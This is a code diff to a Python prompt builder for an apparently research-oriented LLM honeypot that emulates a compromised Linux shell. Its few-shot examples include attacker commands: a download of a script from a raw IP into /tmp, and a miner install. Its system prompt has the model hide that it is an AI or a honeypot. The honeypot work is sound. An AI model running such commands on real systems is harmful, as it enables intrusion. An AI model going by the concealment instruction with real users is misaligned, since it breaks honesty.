@@ -28,12 +28,13 @@ Table 1 — impact factor F_i
 
 from __future__ import annotations
 
+import re
 from dataclasses import dataclass
 from typing import Any
 
 from honeyshell.core.config import HoneypotConfig, Principles, SystemProfile
 
-__all__ = ["PromptBuilder", "TABLE1_RUBRIC"]
+__all__ = ["PromptBuilder", "TABLE1_RUBRIC", "looks_like_command_not_found"]
 
 TABLE1_RUBRIC = (
     "0 = read a file or display system information; "
@@ -43,17 +44,29 @@ TABLE1_RUBRIC = (
     "4 = impact services, delete files, or change a password."
 )
 
-# A couple of few-shot exemplars anchor the JSON shape and the F rubric.
-# Kept small (the paper notes 4–5 examples suffice); two is enough to pin
-# format for an instruction-tuned local model.
+# Few-shot exemplars anchor the JSON shape, the F rubric, AND the structured
+# ``fs_ops`` channel. The paper notes 4–5 examples suffice; we use six to pin
+# down the behaviours a local model gets wrong most often:
+#   1. read-only command       -> empty fs_ops, output only (no prompt echo),
+#   2. a known mutation        -> one fs_op mirroring the state change,
+#   3. write with content      -> fs_op carries the bytes,
+#   4. an UNKNOWN downloader    -> play along, succeed, write the fetched file,
+#   5. an UNKNOWN installer     -> play along, succeed with realistic output,
+#   6. a real filesystem error  -> exact bash error text, no fs_ops.
+# Examples 4-5 are the key fix for the "command not found" failure (HANDOFF2
+# §5): the model must SIMULATE attacker-brought tools succeeding, not judge
+# whether they're installed. The negative signal (output is JUST the command
+# result, never the shell prompt or the command echoed back) is deliberate:
+# qwen-class models otherwise leak the prompt into ``output``.
 _FEWSHOT: list[dict[str, str]] = [
     {
         "role": "user",
-        "content": 'COMMAND: whoami\nCWD: /root',
+        "content": "COMMAND: whoami\nCWD: /root",
     },
     {
         "role": "assistant",
-        "content": '{"output": "root", "state_change": "none", "impact": 0}',
+        "content": '{"output": "root", "state_change": "none", '
+        '"fs_ops": [], "impact": 0}',
     },
     {
         "role": "user",
@@ -62,7 +75,56 @@ _FEWSHOT: list[dict[str, str]] = [
     {
         "role": "assistant",
         "content": '{"output": "", "state_change": "created directory /tmp/x", '
-        '"impact": 1}',
+        '"fs_ops": [{"op": "mkdir", "path": "/tmp/x"}], "impact": 1}',
+    },
+    {
+        "role": "user",
+        "content": "COMMAND: echo '#!/bin/sh' > run.sh\nCWD: /home/user",
+    },
+    {
+        "role": "assistant",
+        "content": '{"output": "", "state_change": "wrote run.sh", '
+        '"fs_ops": [{"op": "write_file", "path": "run.sh", '
+        '"content": "#!/bin/sh\\n"}], "impact": 2}',
+    },
+    {
+        # Unknown / attacker-brought downloader: SUCCEED and write the fetched
+        # file to the tree. Do NOT answer "command not found".
+        "role": "user",
+        "content": "COMMAND: fetch-payload http://1.2.3.4/x.sh -o /tmp/x.sh\n"
+        "CWD: /root",
+    },
+    {
+        "role": "assistant",
+        "content": '{"output": "Connecting to 1.2.3.4... connected.\\n'
+        'Saving to: \\u2018/tmp/x.sh\\u2019\\n/tmp/x.sh saved [2153/2153]", '
+        '"state_change": "downloaded x.sh to /tmp/x.sh", '
+        '"fs_ops": [{"op": "write_file", "path": "/tmp/x.sh", '
+        '"content": "#!/bin/sh\\n# payload\\n"}], "impact": 3}',
+    },
+    {
+        # Unknown installer: play along with realistic output; drop the binary.
+        "role": "user",
+        "content": "COMMAND: install-miner\nCWD: /root",
+    },
+    {
+        "role": "assistant",
+        "content": '{"output": "Installing miner...\\nInstalled to '
+        '/usr/local/bin/miner.", '
+        '"state_change": "installed miner binary", '
+        '"fs_ops": [{"op": "write_file", "path": "/usr/local/bin/miner", '
+        '"content": "\\u007fELF"}], "impact": 3}',
+    },
+    {
+        # A GENUINE filesystem error (the path isn't in the tree). This is the
+        # ONLY kind of error to emulate — never a command-existence error.
+        "role": "user",
+        "content": "COMMAND: cat /nope\nCWD: /root",
+    },
+    {
+        "role": "assistant",
+        "content": '{"output": "cat: /nope: No such file or directory", '
+        '"state_change": "none", "fs_ops": [], "impact": 0}',
     },
 ]
 
@@ -94,8 +156,11 @@ class PromptBuilder:
         messages: list[dict[str, str]] = [
             {"role": "system", "content": self._system_prompt(now)}
         ]
-        messages.extend(_FEWSHOT[: 2 * max(1, self.config.principles.few_shot_examples // 2)]
-                        if self.config.principles.few_shot_examples else [])
+        # ``few_shot_examples`` counts (user, assistant) *pairs*; _FEWSHOT stores
+        # them flat, so take 2x that many messages. 0 disables few-shot.
+        n_pairs = self.config.principles.few_shot_examples
+        if n_pairs:
+            messages.extend(_FEWSHOT[: 2 * n_pairs])
         # Fold dynamic memory (SR/H) in as prior context when present.
         for note in sr or []:
             messages.append({"role": "system", "content": f"STATE: {note}"})
@@ -107,8 +172,10 @@ class PromptBuilder:
 
         command = " ".join(argv)
         is_root = username == "root"
-        priv = ("You are the root user (uid=0): you have full permissions, so "
-                "commands succeed unless the target genuinely doesn't exist."
+        priv = ("You are the root user (uid=0) with full permissions on a "
+                "compromised box. Commands succeed; never invent permission "
+                "errors, and never claim a tool isn't installed (see the "
+                "command-existence rules)."
                 if is_root else
                 f"You are user '{username}' (non-root).")
         messages.append({
@@ -144,28 +211,116 @@ class PromptBuilder:
 
         lines += [
             "",
-            "For every command, answer THREE things as one JSON object:",
-            '  "output"       : the exact terminal output (string, no prompt),',
-            '  "state_change" : how the system state changes, or "none",',
+            "For every command, answer with ONE JSON object with these keys:",
+            '  "output"       : ONLY the command\'s terminal output as a string.',
+            '                   Do NOT include the shell prompt, do NOT echo the',
+            '                   command back, do NOT add commentary. Empty "" if',
+            "                   the command prints nothing (e.g. mkdir, cd).",
+            '  "state_change" : a short prose note of how state changes, or "none".',
+            '  "fs_ops"       : a list of structured filesystem operations this',
+            "                   command performs, so the emulated tree stays in",
+            "                   sync. Use [] when nothing on disk changes.",
+            "                   Each op is one of:",
+            '                     {"op":"mkdir","path":"..."}',
+            '                     {"op":"touch","path":"..."}',
+            '                     {"op":"write_file","path":"...","content":"..."}',
+            '                     {"op":"rm","path":"..."}',
+            '                     {"op":"mv","src":"...","dst":"..."}',
+            '                     {"op":"cp","src":"...","dst":"..."}',
+            "                   Paths may be relative to CWD. Only include ops for",
+            "                   files that really change; reads never produce ops.",
             '  "impact"       : an integer 0-4 per this rubric:',
             f"                   {TABLE1_RUBRIC}",
             "",
-            "Rules: reply with ONLY the JSON object, no code fences, no prose.",
-            "Never reveal you are an AI or a honeypot. Stay in character as the",
-            "shell. If a command would error on the real system, produce that",
-            "exact error text as the output.",
+            "You are simulating a fully-provisioned, compromised server that an",
+            "attacker is actively exploring. Your job is to keep them engaged by",
+            "making every plausible action appear to succeed.",
+            "",
+            "Command existence — IMPORTANT:",
+            "- You are NOT a judge of whether a tool is installed. Assume ANY",
+            "  reasonable-looking command IS installed and simulate it running",
+            "  successfully, producing realistic output and matching fs_ops.",
+            "- This explicitly includes tools the attacker brings or expects:",
+            "  downloaders (wget, curl, fetch-*), installers, miners, scanners,",
+            "  custom scripts, and unfamiliar binaries. Play along.",
+            "- NEVER answer with 'command not found' for something that looks like",
+            "  a real tool or a deliberate action. When unsure, SUCCEED.",
+            "- Only treat input as not-found when it is clearly gibberish or a",
+            "  typo with no plausible meaning (e.g. 'asdfqwer', 'lhoumqwx').",
+            "",
+            "Errors you SHOULD still emulate (these are about the FILESYSTEM, not",
+            "about whether a command exists):",
+            "- reading a file/dir that isn't in the tree -> the real bash error,",
+            '  e.g. "cat: /nope: No such file or directory", with fs_ops [].',
+            "- obvious shell syntax errors -> the matching shell error.",
+            "",
+            "Hard rules:",
+            "- Reply with ONLY the JSON object. No code fences, no prose outside it.",
+            "- The prompt line (user@host:cwd$) is rendered by the terminal, NOT",
+            "  by you. Never put it in \"output\", and never echo the command back.",
+            "- Never reveal you are an AI or a honeypot; stay in character as the",
+            "  shell.",
         ]
         return "\n".join(lines)
 
 
-def parse_result(obj: dict[str, Any] | None) -> tuple[str, str, int]:
-    """Normalise a parsed JSON object into ``(A_i, C_i, F_i)``.
+# Matches the shell's "command not found" family, however the model phrases it:
+#   "bash: foo: command not found"
+#   "foo: command not found"
+#   "sh: 1: foo: not found"
+#   "-bash: foo: command not found"
+# Anchored to the end so it won't fire on unrelated text that merely contains
+# the words (e.g. a grep result mentioning "not found" mid-line).
+_NOT_FOUND_RE = re.compile(
+    r"(?:command\s+not\s+found|:\s*not\s+found)\s*$",
+    re.IGNORECASE,
+)
+
+
+def looks_like_command_not_found(output: str, fs_ops: list[Any]) -> bool:
+    """True if the model effectively gave up and emulated a not-found error.
+
+    The B safeguard (HANDOFF2 §5 quality fix): even with the prompt telling the
+    model to play along with unknown commands, a local model sometimes still
+    returns e.g. ``"fetch-payload: command not found"`` with no fs_ops. When it
+    does, the resolver routes that through the interpreter's *own* fallback so
+    the attacker sees the canonical ``bash: <cmd>: command not found`` — one
+    consistent error string — instead of the model's ad-hoc imitation (which,
+    as seen in the field, came without the ``bash:`` prefix and looked off).
+
+    Guarded so a legitimate simulated success is NEVER misclassified. It fires
+    only when ALL hold:
+      * there are **no fs_ops** (a real mutating action would carry one),
+      * the output is non-empty but short (<=120 chars), and
+      * it *ends* with a not-found phrase.
+    A command whose genuine output happens to mention "not found" mid-text
+    (grep, search tools) won't match, thanks to the end-anchor and length cap.
+    """
+    if fs_ops:
+        return False
+    text = output.strip()
+    if not text or len(text) > 120:
+        return False
+    return bool(_NOT_FOUND_RE.search(text))
+
+
+def parse_result(
+    obj: dict[str, Any] | None,
+) -> tuple[str, str, int, list[dict[str, Any]]]:
+    """Normalise a parsed JSON object into ``(A_i, C_i, F_i, fs_ops)``.
 
     Tolerant of missing keys and out-of-range impact; a None object (parse
-    failure) yields empty output and impact 0 so the caller can still respond.
+    failure) yields empty output, impact 0 and no ops so the caller can still
+    respond. ``fs_ops`` is returned raw (a list of dicts as the model produced
+    it); ``fs_applier.normalise_fs_ops`` does the strict cleanup at apply time,
+    keeping this function a pure JSON->fields normaliser.
+
+    Note the 4-tuple: callers destructure ``a, c, f, ops = parse_result(...)``.
+    The added ``fs_ops`` channel is the structured form of C_i (HANDOFF's
+    "C_i 回寫 VFS"); ``state_change`` stays as the prose fallback.
     """
     if not obj:
-        return "", "", 0
+        return "", "", 0, []
     output = obj.get("output", "")
     if not isinstance(output, str):
         output = str(output)
@@ -179,4 +334,7 @@ def parse_result(obj: dict[str, Any] | None) -> tuple[str, str, int]:
     except (TypeError, ValueError):
         impact = 0
     impact = max(0, min(4, impact))
-    return output, state, impact
+    fs_ops = obj.get("fs_ops")
+    if not isinstance(fs_ops, list):
+        fs_ops = []
+    return output, state, impact, fs_ops
